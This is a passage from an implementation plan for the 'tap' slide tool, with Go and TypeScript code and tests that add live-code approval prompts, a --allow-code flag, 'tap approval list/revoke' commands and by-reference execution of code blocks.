	command.Env = append(os.Environ(), "XDG_CONFIG_HOME="+configHome)
	var output bytes.Buffer
	command.Stdout = &output
	command.Stderr = &output
	if err := command.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_ = command.Process.Signal(syscall.SIGINT)
		_ = command.Wait()
	})

	base := fmt.Sprintf("http://localhost:%d", port)
	deadline := time.Now().Add(20 * time.Second)
	for {
		response, err := http.Get(base + "/api/presentation")
		if err == nil {
			response.Body.Close()
			if response.StatusCode == http.StatusOK {
				return base
			}
		}
		if time.Now().After(deadline) {
			_ = command.Process.Kill()
			_ = command.Wait()
			t.Fatalf("tap dev did not start:\n%s", output.String())
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// postExecute sends body to /api/execute the way the Run button does, and
// returns the status and the output or error text.
func postExecute(t *testing.T, base, body string) (int, string) {
	t.Helper()
	request, err := http.NewRequest(http.MethodPost, base+"/api/execute", strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("Origin", base)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		t.Fatalf("POST /api/execute: %v", err)
	}
	defer response.Body.Close()
	var result struct {
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	_ = json.NewDecoder(response.Body).Decode(&result)
	return response.StatusCode, result.Output + result.Error
}

// TestDevRunsALiveShellBlockByReference starts a real tap dev with
// --allow-code and runs the deck's shell block by reference, as the Run
// button does.
func TestDevRunsALiveShellBlockByReference(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping subprocess test in short mode")
	}
	base := startDevForLiveCode(t, writeLiveCodeDeck(t), t.TempDir(), "--allow-code")

	status, text := postExecute(t, base, `{"slide": 1, "block": 1}`)
	if status != http.StatusOK || !strings.Contains(text, "hello from tap") {
		t.Errorf("the deck's block: status %d, output %q, want 200 and \"hello from tap\"", status, text)
	}

	status, _ = postExecute(t, base, `{"driver": "shell", "code": "echo not in the deck"}`)
	if status != http.StatusBadRequest {
		t.Errorf("a code body: status %d, want 400", status)
	}
}

func TestDevKeepsLiveCodeOffForAnUnapprovedDeck(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping subprocess test in short mode")
	}
	configHome := t.TempDir()
	base := startDevForLiveCode(t, writeLiveCodeDeck(t), configHome)

	status, text := postExecute(t, base, `{"slide": 1, "block": 1}`)
	if status != http.StatusForbidden || !strings.Contains(text, "Not approved") {
		t.Errorf("status %d, output %q, want 403 Not approved", status, text)
	}
	if _, err := os.Stat(filepath.Join(configHome, "tap", "settings.yaml")); !os.IsNotExist(err) {
		t.Errorf("a run that did not ask saved the settings file (stat error %v)", err)
	}
}

func TestDevRunsAnApprovedDeckWithoutATerminal(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping subprocess test in short mode")
	}
	deckPath := writeLiveCodeDeck(t)
	configHome := t.TempDir()
	var settings usersettings.Settings
	settings.Approve(deckPath, []string{"shell"}, time.Now())
	if err := usersettings.Save(filepath.Join(configHome, "tap", "settings.yaml"), settings); err != nil {
		t.Fatal(err)
	}

	base := startDevForLiveCode(t, deckPath, configHome)
	status, text := postExecute(t, base, `{"slide": 1, "block": 1}`)
	if status != http.StatusOK || !strings.Contains(text, "hello from tap") {
		t.Errorf("status %d, output %q, want 200", status, text)
	}
}
```

`t.TempDir()` returns an absolute path, and `tap dev` keys the approval by `filepath.Abs` of its argument, so the two paths match.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/cli -run 'TestUndeclaredDriverWarnings|TestDevHasTheAllowCodeFlag|TestPresentCommandIsRegistered' -short`
Expected: compile failure, `undefined: undeclaredDriverWarnings`.

Run: `go test ./internal/cli -run 'TestDevRunsALiveShellBlockByReference|TestDevKeepsLiveCodeOff|TestDevRunsAnApprovedDeck' -v`
Expected: FAIL, `unknown flag: --allow-code` and 403 for the approved deck.

- [ ] **Step 3: Write `internal/cli/live_code_warnings.go`**

```go
package cli

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/MiniCodeMonkey/tap/internal/slidelist"
	"github.com/MiniCodeMonkey/tap/internal/transformer"
)

// liveBlockReference names a live code block the way /api/execute does:
// the slide number and the block's number among the slide's live blocks.
type liveBlockReference struct {
	slide int
	block int
}

// undeclaredDriverWarnings returns one line per live code block whose
// driver the deck does not declare: the deck file, the block's line, and
// the message the page shows in the block.
func undeclaredDriverWarnings(file string, pres *transformer.TransformedPresentation) []string {
	type problem struct {
		reference liveBlockReference
		message   string
	}
	var problems []problem
	for _, slide := range pres.Slides {
		for _, block := range slide.CodeBlocks {
			if block.Problem != "" {
				problems = append(problems, problem{liveBlockReference{slide.Index + 1, block.Block}, block.Problem})
			}
		}
	}
	if len(problems) == 0 {
		return nil
	}

	lines := liveBlockLines(file)
	warnings := make([]string, 0, len(problems))
	for _, found := range problems {
		location := fmt.Sprintf("%s: slide %d", file, found.reference.slide)
		if line, known := lines[found.reference]; known {
			location = fmt.Sprintf("%s:%d", file, line)
		}
		warnings = append(warnings, fmt.Sprintf("warning: %s: %s", location, found.message))
	}
	return warnings
}

// liveBlockLines maps each live code block to its line in the deck file.
// It builds the slide list only when a warning needs it, because the list
// also builds the deck's component bundles.
func liveBlockLines(file string) map[liveBlockReference]int {
	source, err := os.ReadFile(file)
	if err != nil {
		return nil
	}
	result, err := slidelist.Build(source, filepath.Dir(file))
	if err != nil {
		return nil
	}
	lines := make(map[liveBlockReference]int)
	for _, slide := range result.Slides {
		block := 0
		for _, codeBlock := range slide.CodeBlocks {
			if !codeBlock.Live {
				continue
			}
			block++
			lines[liveBlockReference{slide.Number, block}] = codeBlock.Line
		}
	}
	return lines
}
```

Check P3's `internal/slidelist` before running: the field names are `Slides`, `Number`, `CodeBlocks`, `Live` and `Line` in the roadmap contract. If P3 named any of them differently, use its names.

- [ ] **Step 4: Add `--allow-code` (`internal/cli/dev.go`, `present.go`)**

1. In `serverOptions`, add:

```go
	// allowCode lets live code run for this run without an approval, and
	// stores nothing. It is --allow-code.
	allowCode bool
```

2. In `dev.go`, add `devAllowCode bool` to the flag `var` block, pass `allowCode: devAllowCode` in the `serverOptions{...}` of `RunE`, and register:

```go
	devCmd.Flags().BoolVar(&devAllowCode, "allow-code", false, "let the deck's live code run for this run without an approval, and save none (for --headless and scripts)")
```

Add to the examples in `Long`:

```
  tap dev slides.md --headless --allow-code   # Run live code without asking, for this run only
```

and this sentence after the list of what the dev server provides: "A deck with live code asks for approval once, in the terminal, before it runs anything. tap approval list shows the approved decks."

3. In `present.go`, add `presentAllowCode bool`, pass `allowCode: presentAllowCode`, and register:

```go
	presentCmd.Flags().BoolVar(&presentAllowCode, "allow-code", false, "let the deck's live code run for this run without an approval, and save none")
```

- [ ] **Step 5: Run the approval check in `runDevServer`**

1. After the three `print...ToStderr` calls that follow `loadPresentation`, add:

```go
	startupDriverWarnings := undeclaredDriverWarnings(absFile, pres)
	for _, warning := range startupDriverWarnings {
		fmt.Fprintln(os.Stderr, warning)
	}

	// Live code approval happens here, before the TUI owns the terminal.
	settingsPath, err := usersettings.Path()
	if err != nil {
		return internalError(codeInternal, err)
	}
	liveCodePolicy, err := liveCodeApproval(approvalInput{
		Now:          time.Now,
		Config:       cfg,
		Presentation: pres,
		Asker:        terminalAsker{in: os.Stdin, out: os.Stdout},
		Out:          os.Stdout,
		SettingsPath: settingsPath,
		Deck:         absFile,
		AllowCode:    options.allowCode,
		Interactive:  stdinIsTerminal() && !headless,
	})
	if err != nil {
		return internalError(codeInternal, err)
	}
```

2. In `buildServer`, after P1's `candidate.SetRegistry(buildDriverRegistry(cfg, baseDir))`, add:

```go
		candidate.SetLiveCodePolicy(liveCodePolicy)
```

The policy stays the same for the whole run. A driver added by a reload is not in it, so its blocks show "Not approved" until the next start asks.

3. In the first `watcher.SetOnChange` handler and in the headless handler, after the `print...ToStderr` calls, add:

```go
		for _, warning := range undeclaredDriverWarnings(absFile, newPres) {
			fmt.Fprintln(os.Stderr, warning)
		}
```

4. In `reloadInTUI`, change the `model.SetWarnings(...)` line to:

```go
			model.SetWarnings(append(componentWarningLines(componentWarnings(newResolvedComponents)), undeclaredDriverWarnings(absFile, newPres)...))
```

5. In the TUI branch, after `devModel = model`, add:

```go
		// The terminal lines above scroll away when the TUI starts, so the
		// TUI shows them too.
		if len(startupDriverWarnings) > 0 {
			model.SetWarnings(startupDriverWarnings)
		}
```

6. Add `"github.com/MiniCodeMonkey/tap/internal/usersettings"` to the imports of `dev.go`.

In `tap present`, the recording consent prompt in `present.go` runs before `runDevServer`, so the consent question comes first and the approval question second.

- [ ] **Step 6: Run the tests to verify they pass**

Run: `go test ./internal/cli -run 'TestUndeclaredDriverWarnings|TestDevHasTheAllowCodeFlag|TestPresentCommandIsRegistered|TestEveryCommandFollows' -short -v`
Expected: PASS.

Run: `go test ./internal/cli -run 'TestDevRunsALiveShellBlockByReference|TestDevKeepsLiveCodeOff|TestDevRunsAnApprovedDeck|TestDevListensOn' -v`
Expected: PASS (the `TestDevListensOn` tests may SKIP on a machine with no LAN address).

Run: `go test ./... -short`
Expected: PASS.

- [ ] **Step 7: Try the prompt by hand**

Run:

```bash
go build -o /tmp/tap-approval ./cmd/tap
XDG_CONFIG_HOME=$(mktemp -d) /tmp/tap-approval dev examples/code-demo.md
```

Expected: before the TUI, the prompt lists `python` (with `runs: python3 -c`) and `shell`, `s` prints the blocks, and Enter answers no. Quit with `q` and run it again: it asks again. Answer `y`, quit, run again: it does not ask.

- [ ] **Step 8: Commit**

```bash
git add internal/cli/live_code_warnings.go internal/cli/live_code_warnings_test.go internal/cli/dev.go internal/cli/present.go internal/cli/root_test.go internal/cli/live_code_test.go
git commit -m "feat(dev): approve live code at startup, and add --allow-code"
```

---

### Task 9: `tap approval list` and `tap approval revoke`

**Files:**
- Create: `internal/cli/approval_command.go`
- Create: `internal/cli/approval_command_test.go`
- Modify: `internal/cli/exit.go`
- Modify: `internal/cli/conventions_test.go`

**Interfaces:**
- Consumes: `usersettings` approvals (Task 1); P1's `resolveDeck`, `userError`, `internalError`, `printJSONOK`, `runTap`, `expectedCommands`
- Produces:
  - Commands `tap approval`, `tap approval list [--json]`, `tap approval revoke <deck> [--json]`
  - `codeNotApproved = "not_approved"`, `codeInvalidSettings = "invalid_settings"` in `exit.go`
  - `tap approval list --json`: `{"ok": true, "approvals": [{"deck": "...", "drivers": ["shell"], "approvedAt": "2026-09-22T19:32:00Z"}]}`
  - `tap approval revoke --json`: `{"ok": true, "deck": "/abs/path.md"}`
  - `func approvalDeckPath(arg string) (string, error)`

- [ ] **Step 1: Write the failing tests**

`internal/cli/approval_command_test.go`:

```go
package cli

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/MiniCodeMonkey/tap/internal/usersettings"
)

// useSettings points the user settings at a new folder for one test and
// returns the settings file path.
func useSettings(t *testing.T, approvals ...usersettings.Approval) string {
	t.Helper()
	configHome := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", configHome)
	path := filepath.Join(configHome, "tap", "settings.yaml")
	if len(approvals) > 0 {
		if err := usersettings.Save(path, usersettings.Settings{Approvals: approvals}); err != nil {
			t.Fatal(err)
		}
	}
	return path
}

var listedAt = time.Date(2026, 9, 22, 19, 32, 0, 0, time.UTC)

func TestApprovalListWithNoApprovals(t *testing.T) {
	useSettings(t)
	exitCode, stdout, stderr := runTap(t, "approval", "list")
	if exitCode != exitOK || stdout != "No deck is approved to run live code.\n" {
		t.Errorf("exit %d, stdout %q, stderr %q", exitCode, stdout, stderr)
	}
}

func TestApprovalListText(t *testing.T) {
	useSettings(t,
		usersettings.Approval{Deck: "/talks/a.md", Drivers: []string{"shell", "sqlite"}, ApprovedAt: listedAt},
		usersettings.Approval{Deck: "/talks/b.md", Drivers: []string{}, ApprovedAt: listedAt},
	)
	exitCode, stdout, _ := runTap(t, "approval", "list")
	want := "/talks/a.md\n  drivers:  shell, sqlite\n  approved: 2026-09-22T19:32:00Z\n" +
		"/talks/b.md\n  drivers:  none\n  approved: 2026-09-22T19:32:00Z\n"
	if exitCode != exitOK || stdout != want {
		t.Errorf("exit %d, stdout:\n%s\nwant:\n%s", exitCode, stdout, want)
	}
}

func TestApprovalListJSON(t *testing.T) {
	useSettings(t, usersettings.Approval{Deck: "/talks/a.md", Drivers: []string{"shell"}, ApprovedAt: listedAt})
	exitCode, stdout, _ := runTap(t, "approval", "list", "--json")
	var decoded struct {
		OK        bool `json:"ok"`
		Approvals []struct {
			Deck       string   `json:"deck"`
			Drivers    []string `json:"drivers"`
			ApprovedAt string   `json:"approvedAt"`
		} `json:"approvals"`
	}
	if err := json.Unmarshal([]byte(stdout), &decoded); err != nil {
		t.Fatalf("not JSON: %v\n%s", err, stdout)
	}
	if exitCode != exitOK || !decoded.OK || len(decoded.Approvals) != 1 {
		t.Fatalf("exit %d, decoded %+v", exitCode, decoded)
	}
	approval := decoded.Approvals[0]
	if approval.Deck != "/talks/a.md" || strings.Join(approval.Drivers, ",") != "shell" || approval.ApprovedAt != "2026-09-22T19:32:00Z" {
		t.Errorf("approval = %+v", approval)
	}
}

func TestApprovalListJSONWithNoApprovalsIsAnEmptyList(t *testing.T) {
	useSettings(t)
	_, stdout, _ := runTap(t, "approval", "list", "--json")
	if !strings.Contains(stdout, `"approvals": []`) {
		t.Errorf("stdout = %q, want an empty list, not null", stdout)
	}
}

func TestApprovalRevoke(t *testing.T) {
	deckPath := filepath.Join(t.TempDir(), "talk.md")
	if err := os.WriteFile(deckPath, []byte("# Talk\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	settingsPath := useSettings(t,
		usersettings.Approval{Deck: deckPath, Drivers: []string{"shell"}, ApprovedAt: listedAt},
		usersettings.Approval{Deck: "/talks/other.md", Drivers: []string{"shell"}, ApprovedAt: listedAt},
	)

	exitCode, stdout, stderr := runTap(t, "approval", "revoke", deckPath)
	if exitCode != exitOK || !strings.Contains(stdout, "Revoked: "+deckPath) {
		t.Fatalf("exit %d, stdout %q, stderr %q", exitCode, stdout, stderr)
	}
	settings, _ := usersettings.Load(settingsPath)
	if len(settings.Approvals) != 1 || settings.Approvals[0].Deck != "/talks/other.md" {
		t.Errorf("approvals = %+v, want only the other deck", settings.Approvals)
	}
}

func TestApprovalRevokeTakesTheDeckFolder(t *testing.T) {
	folder := t.TempDir()
	deckPath := filepath.Join(folder, "talk.md")
	if err := os.WriteFile(deckPath, []byte("# Talk\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	useSettings(t, usersettings.Approval{Deck: deckPath, Drivers: []string{"shell"}, ApprovedAt: listedAt})

	exitCode, _, stderr := runTap(t, "approval", "revoke", folder)
	if exitCode != exitOK {
		t.Errorf("exit %d, stderr %q", exitCode, stderr)
	}
}

func TestApprovalRevokeADeckThatNoLongerExists(t *testing.T) {
	useSettings(t, usersettings.Approval{Deck: "/gone/talk.md", Drivers: []string{"shell"}, ApprovedAt: listedAt})
	exitCode, stdout, _ := runTap(t, "approval", "revoke", "/gone/talk.md", "--json")
	if exitCode != exitOK || !strings.Contains(stdout, `"deck": "/gone/talk.md"`) {
		t.Errorf("exit %d, stdout %q", exitCode, stdout)
	}
}

func TestApprovalRevokeAnUnapprovedDeck(t *testing.T) {
	useSettings(t)
	exitCode, stdout, _ := runTap(t, "approval", "revoke", "/talks/never.md", "--json")
	if exitCode != exitUserError || !strings.Contains(stdout, `"code": "not_approved"`) {
		t.Errorf("exit %d, stdout %q", exitCode, stdout)
	}
}
```

In `internal/cli/conventions_test.go`, add to `expectedCommands`, keeping it sorted:

```go
	"tap approval",
	"tap approval list",
	"tap approval revoke",
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/cli -run 'TestApprovalList|TestApprovalRevoke|TestCommandTree' -short`
Expected: FAIL, `unknown command "approval"`.

- [ ] **Step 3: Add the error codes (`internal/cli/exit.go`)**

Add to the error code `const` block:

```go
	codeNotApproved     = "not_approved"
	codeInvalidSettings = "invalid_settings"
```

- [ ] **Step 4: Write `internal/cli/approval_command.go`**

```go
package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/MiniCodeMonkey/tap/internal/usersettings"
)

var (
	approvalListJSON   bool
	approvalRevokeJSON bool
)

var approvalCmd = &cobra.Command{
	Use:   "approval",
	Short: "List and revoke the decks allowed to run live code",
	Long: `A deck with live code runs nothing until you approve it. tap dev and
tap present ask once, in the terminal, and remember the answer in
~/.config/tap/settings.yaml, keyed by the deck's path and the drivers you
allowed. A moved deck, or a new driver, asks again.`,
}

var approvalListCmd = &cobra.Command{
	Use:   "list",
	Short: "List the decks allowed to run live code",
	Long: `List the decks allowed to run live code, with the drivers each may use.

Examples:
  tap approval list
  tap approval list --json`,
	Args: cobra.NoArgs,
	RunE: runApprovalList,
}

var approvalRevokeCmd = &cobra.Command{
	Use:   "revoke <deck>",
	Short: "Stop a deck from running live code until you approve it again",
	Long: `Remove a deck's approval. tap asks again the next time it opens the deck.

<deck> is the deck file or its folder. A deck that was moved or deleted
can be revoked by its old path.

Examples:
  tap approval revoke talk.md
  tap approval revoke ~/talks/old-place/talk.md`,
	Args: cobra.ExactArgs(1),
	RunE: runApprovalRevoke,
}

func init() {
	rootCmd.AddCommand(approvalCmd)
	approvalCmd.AddCommand(approvalListCmd)
	approvalCmd.AddCommand(approvalRevokeCmd)
	approvalListCmd.Flags().BoolVar(&approvalListJSON, "json", false, "print the approvals as JSON")
	approvalRevokeCmd.Flags().BoolVar(&approvalRevokeJSON, "json", false, "print the result as JSON")
}

// loadApprovalSettings returns the settings file path and its contents.
func loadApprovalSettings() (string, usersettings.Settings, error) {
	settingsPath, err := usersettings.Path()
	if err != nil {
		return "", usersettings.Settings{}, internalError(codeInternal, err)
	}
	settings, err := usersettings.Load(settingsPath)
	if err != nil {
		return "", usersettings.Settings{}, userError(codeInvalidSettings, err)
	}
	return settingsPath, settings, nil
}

func runApprovalList(cmd *cobra.Command, args []string) error {
	_, settings, err := loadApprovalSettings()
	if err != nil {
		return err
	}
	approvals := make([]usersettings.Approval, 0, len(settings.Approvals))
	for _, approval := range settings.Approvals {
		if approval.Drivers == nil {
			approval.Drivers = []string{}
		}
		approvals = append(approvals, approval)
	}

	out := cmd.OutOrStdout()
	if approvalListJSON {
		return printJSONOK(out, struct {
			Approvals []usersettings.Approval `json:"approvals"`
		}{Approvals: approvals})
	}
	if len(approvals) == 0 {
		fmt.Fprintln(out, "No deck is approved to run live code.")
		return nil
	}
	for _, approval := range approvals {
		drivers := strings.Join(approval.Drivers, ", ")
		if drivers == "" {
			drivers = "none"
		}
		fmt.Fprintln(out, approval.Deck)
		fmt.Fprintf(out, "  drivers:  %s\n", drivers)
		fmt.Fprintf(out, "  approved: %s\n", approval.ApprovedAt.UTC().Format(time.RFC3339))
	}
	return nil
}

func runApprovalRevoke(cmd *cobra.Command, args []string) error {
	deck, err := approvalDeckPath(args[0])
	if err != nil {
		return err
	}
	settingsPath, settings, err := loadApprovalSettings()
	if err != nil {
		return err
	}
	if !settings.Revoke(deck) {
		return userError(codeNotApproved, fmt.Errorf("%s is not approved to run live code", deck))
	}
	if err := usersettings.Save(settingsPath, settings); err != nil {
		return internalError(codeInternal, err)
	}

	out := cmd.OutOrStdout()
	if approvalRevokeJSON {
		return printJSONOK(out, struct {
			Deck string `json:"deck"`
		}{Deck: deck})
	}
	fmt.Fprintf(out, "Revoked: %s. tap asks again the next time it opens this deck.\n", deck)
	return nil
}

// approvalDeckPath turns the revoke argument into the absolute path the
// approval is stored under. A file or folder that exists goes through the
// shared deck resolver, so a folder names the deck in it. A path that no
// longer exists, such as a moved or deleted deck, is used as given.
func approvalDeckPath(arg string) (string, error) {
	if _, err := os.Stat(arg); err == nil {
		resolved, err := resolveDeck(arg)
		if err != nil {
			return "", err
		}
		arg = resolved
	}
	absolute, err := filepath.Abs(arg)
	if err != nil {
		return "", internalError(codeInternal, err)
	}
	return absolute, nil
}
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `go test ./internal/cli -run 'TestApprovalList|TestApprovalRevoke|TestCommandTree|TestEveryCommandFollows' -short -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/cli/approval_command.go internal/cli/approval_command_test.go internal/cli/exit.go internal/cli/conventions_test.go
git commit -m "feat(cli): add tap approval list and tap approval revoke"
```

---

### Task 10: `tap new` approves the deck it writes

**Files:**
- Modify: `internal/cli/new.go`
- Modify: `internal/cli/new_test.go`

**Interfaces:**
- Consumes: `usersettings` approvals (Task 1); `Config.DeclaredDrivers` (Task 3); P1's `runNewNonInteractive`, the wizard branch of `newCmd.RunE`, `withWorkingDirectory`
- Produces: `func approveNewDeck(deck string, now time.Time) error`

- [ ] **Step 1: Write the failing tests**

Add to `internal/cli/new_test.go` (add the imports it lacks: `"github.com/MiniCodeMonkey/tap/internal/config"`, `"github.com/MiniCodeMonkey/tap/internal/parser"`, `"github.com/MiniCodeMonkey/tap/internal/transformer"`, `"github.com/MiniCodeMonkey/tap/internal/tui"`, `"github.com/MiniCodeMonkey/tap/internal/usersettings"`):

```go
func TestNewApprovesTheDeckItWrites(t *testing.T) {
	configHome := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", configHome)
	dir := t.TempDir()

	var deckPath string
	withWorkingDirectory(t, dir, func() {
		exitCode, _, stderr := runTap(t, "new", "talk.md", "--yes")
		if exitCode != exitOK {
			t.Fatalf("exit %d, stderr %q", exitCode, stderr)
		}
		deckPath, _ = filepath.Abs("talk.md")
	})

	settings, err := usersettings.Load(filepath.Join(configHome, "tap", "settings.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	if _, found := settings.ApprovalFor(deckPath); !found {
		t.Errorf("no approval for %s: %+v", deckPath, settings.Approvals)
	}
}

func TestNewJSONStaysJSONWhenTheApprovalCannotBeSaved(t *testing.T) {
	configHome := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", configHome)
	if err := os.MkdirAll(filepath.Join(configHome, "tap"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(configHome, "tap", "settings.yaml"), []byte("approvals: [not: valid"), 0o600); err != nil {
		t.Fatal(err)
	}

	withWorkingDirectory(t, t.TempDir(), func() {
		exitCode, stdout, stderr := runTap(t, "new", "talk.md", "--json")
		if exitCode != exitOK || !strings.HasPrefix(stdout, "{") {
			t.Errorf("exit %d, stdout %q", exitCode, stdout)
		}
		if !strings.Contains(stderr, "could not record the live code approval") {
			t.Errorf("stderr = %q, want the warning", stderr)
		}
	})
}

func TestStarterDeclaresEveryDriverItUses(t *testing.T) {
	content := tui.GenerateStarterMarkdown("Title", tui.DefaultTheme(), "2026-09-22", "Author")
	deckPath := filepath.Join(t.TempDir(), "starter.md")
	if err := os.WriteFile(deckPath, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(deckPath)
	if err != nil {
		t.Fatal(err)
	}
	parsed, err := parser.New().Parse([]byte(content))
	if err != nil {
		t.Fatal(err)
	}
	for _, slide := range transformer.New(cfg).Transform(parsed).Slides {
		for _, block := range slide.CodeBlocks {
			if block.Problem != "" {
				t.Errorf("slide %d: %s", slide.Index+1, block.Problem)
			}
		}
	}
}
```

`runTap` captures only what commands write through `cmd.ErrOrStderr()`. The warning in Step 3 writes there, so the second test can read it.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/cli -run 'TestNewApproves|TestNewJSONStaysJSON|TestStarterDeclares' -short`
Expected: `TestNewApprovesTheDeckItWrites` and `TestNewJSONStaysJSON...` FAIL. `TestStarterDeclaresEveryDriverItUses` PASSES, because today's starter has no live code. It stays as the guard that a starter with live code declares its drivers.

- [ ] **Step 3: Approve in `internal/cli/new.go`**

Add:

```go
// approveNewDeck approves the deck tap new just wrote, with the drivers its
// frontmatter declares, so the person who made it is not asked about it.
func approveNewDeck(deck string, now time.Time) error {
	absolute, err := filepath.Abs(deck)
	if err != nil {
		return err
	}
	cfg, err := config.Load(absolute)
	if err != nil {
		return err
	}
	settingsPath, err := usersettings.Path()
	if err != nil {
		return err
	}
	settings, err := usersettings.Load(settingsPath)
	if err != nil {
		return err
	}
	settings.Approve(absolute, cfg.DeclaredDrivers(), now)
	return usersettings.Save(settingsPath, settings)
}

// recordNewDeckApproval approves a new deck, and only warns when that
// fails: the deck is written either way.
func recordNewDeckApproval(cmd *cobra.Command, deck string) {
	if err := approveNewDeck(deck, time.Now()); err != nil {
		fmt.Fprintf(cmd.ErrOrStderr(), "warning: could not record the live code approval for %s: %v\n", deck, err)
	}
}
```

A malformed settings file makes `approveNewDeck` fail rather than replace the file, so `tap new` never loses the person's other settings.

Call it in two places:

1. In `runNewNonInteractive`, right after the successful `os.WriteFile(output, ...)`: `recordNewDeckApproval(cmd, output)`. `runNewNonInteractive` has no `cmd` parameter after P1. Change its signature to `func runNewNonInteractive(cmd *cobra.Command) error`, pass `cmd` from `RunE`, and pass `newCmd` in the existing `new_test.go` calls (`runNewNonInteractive(newCmd)`). In the same function, change P1's `printJSONOK(os.Stdout, ...)` to `printJSONOK(cmd.OutOrStdout(), ...)` and `fmt.Println(output)` to `fmt.Fprintln(cmd.OutOrStdout(), output)`, so `runTap` sees the result (`TestNewJSONStaysJSONWhenTheApprovalCannotBeSaved` reads it).
2. In `RunE`, in the wizard branch, after `if result.Aborted { return errCancelled }`:

```go
		recordNewDeckApproval(cmd, result.Filename)
		return nil
```

Check that `tui.NewModelResult.Filename` is the written path: `NewModel.GetResult` sets it from `outputPath`. If it holds only the name without the folder, it is still relative to the working directory, which is what `filepath.Abs` expects.

Add `"path/filepath"`, `"github.com/MiniCodeMonkey/tap/internal/config"` and `"github.com/MiniCodeMonkey/tap/internal/usersettings"` to the imports of `new.go`.

Add this sentence to the `Long` text of `tap new`: "The new deck is approved to run live code with the drivers its frontmatter declares."

- [ ] **Step 4: Run the tests to verify they pass**

Run: `go test ./internal/cli -run 'TestNew|TestRunNewNonInteractive|TestStarterDeclares' -short -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/cli/new.go internal/cli/new_test.go
git commit -m "feat(new): approve the deck tap new writes"
```

---

### Task 11: The Run button sends `{slide, block}`

**Files:**
- Modify: `frontend/src/lib/types.ts`
- Modify: `frontend/src/lib/components/LiveCodeBlock.tsx`
- Modify: `frontend/src/lib/components/LiveCodeBlock.test.tsx`
- Modify: `frontend/src/lib/components/Slide.tsx`
- Modify: `frontend/src/lib/components/Slide.test.tsx`
- Modify: `frontend/src/lib/styles/rich-blocks.css`

**Interfaces:**
- Consumes: `codeBlocks[].block`, `codeBlocks[].problem` (Task 3); `liveCode.drivers` in `/api/presentation` (Task 5); the 403 and 422 answers (Task 4)
- Produces:
  - `CodeBlock.block?: number`, `CodeBlock.problem?: string`, `Presentation.liveCode?: LiveCodeStatus`, `LiveCodeStatus { drivers: string[] }`, `ExecuteRequest { slide: number; block: number }`
  - `LiveCodeBlockProps.slideNumber: number`
  - A block shows Run when its driver is in `liveCode.drivers` (or when `liveCode` is absent), a disabled "Not approved" button when it is not, and the problem text instead of either when `problem` is set.

The presenter page renders slides through the same `Slide` component (`PresenterApp.tsx`), so it sends the reference too.

- [ ] **Step 1: Write the failing tests**

In `frontend/src/lib/components/LiveCodeBlock.test.tsx`:

1. Add `block: 1,` to the object `sqlBlock` returns, after `connection: 'demo',`.
2. Add `import { usePresentationStore } from '../stores/presentation';`.
3. Give every render a slide number:

```bash
cd frontend && perl -pi -e 's/(<LiveCodeBlock codeBlock=\{sqlBlock\(.*?\)\}) \/>/$1 slideNumber={4} \/>/' src/lib/components/LiveCodeBlock.test.tsx
```

4. Rename `'sends the code, driver and connection to POST /api/execute when run'` to `'sends only the slide and block to POST /api/execute when run'`, and change its expected body to `body: JSON.stringify({ slide: 4, block: 1 })`.
5. Add inside the `describe('LiveCodeBlock', ...)` block:

```tsx
	describe('with live code status from the server', () => {
		afterEach(() => {
			usePresentationStore.setState({ presentation: null });
		});

		function withLiveCode(drivers: string[]) {
			usePresentationStore.setState({ presentation: { config: {}, slides: [], liveCode: { drivers } } });
		}

		it('shows the Run button for a driver this run allows', async () => {
			withLiveCode(['sqlite']);
			render(<LiveCodeBlock codeBlock={sqlBlock()} slideNumber={4} />);
			expect(await screen.findByRole('button', { name: 'Run code' })).toBeEnabled();
		});

		it('shows "Not approved" for a driver this run does not allow', async () => {
			withLiveCode([]);
			render(<LiveCodeBlock codeBlock={sqlBlock()} slideNumber={4} />);
			expect(await screen.findByRole('button', { name: 'Not approved' })).toBeDisabled();
			expect(screen.queryByRole('button', { name: 'Run code' })).not.toBeInTheDocument();
		});

		it('does not run on Ctrl+Enter when not approved', async () => {
			withLiveCode([]);
			const fetchMock = vi.fn();
			vi.stubGlobal('fetch', fetchMock);
			render(<LiveCodeBlock codeBlock={sqlBlock()} slideNumber={4} />);
			fireEvent.keyDown(screen.getByRole('application'), { key: 'Enter', ctrlKey: true });
			expect(fetchMock).not.toHaveBeenCalled();
		});
	});

	it('shows why a block with an undeclared driver cannot run', async () => {
		const problem = 'This deck does not declare the sqlite driver. Add "sqlite: {}" under drivers in the frontmatter.';
		render(<LiveCodeBlock codeBlock={sqlBlock({ problem })} slideNumber={4} />);
		expect(await screen.findByText(problem)).toBeInTheDocument();
		expect(screen.queryByRole('button', { name: 'Run code' })).not.toBeInTheDocument();
		expect(screen.queryByRole('button', { name: 'Not approved' })).not.toBeInTheDocument();
	});

	it("shows the server's reason when it refuses a run", async () => {
		const fetchMock = vi.fn(
			async () =>
				({
					ok: false,
					json: async () => ({ success: false, error: 'Not approved: this deck may not run code with this driver.' })
				}) as unknown as Response
		);
		vi.stubGlobal('fetch', fetchMock);
